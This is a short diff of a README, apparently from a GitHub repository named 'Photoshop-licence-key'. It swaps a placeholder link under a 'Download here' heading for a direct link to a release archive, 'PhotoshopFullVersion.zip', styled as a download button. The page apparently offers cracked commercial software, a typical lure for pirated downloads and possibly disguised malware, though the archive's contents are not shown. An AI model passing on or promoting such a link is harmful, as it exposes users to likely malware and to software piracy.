@@ -6,7 +6,7 @@
 
 ## 📥 Download here
 
-<a href="#" download now>
+<a href="https://github.com/Kaar121/Photoshop-licence-key/releases/download/fulk/PhotoshopFullVersion.zip" download now>
   <img src="https://img.shields.io/badge/Download-blue?logo=Download&logoColor=white&style=for-the-badge" alt="Download"/>
 </a>
 
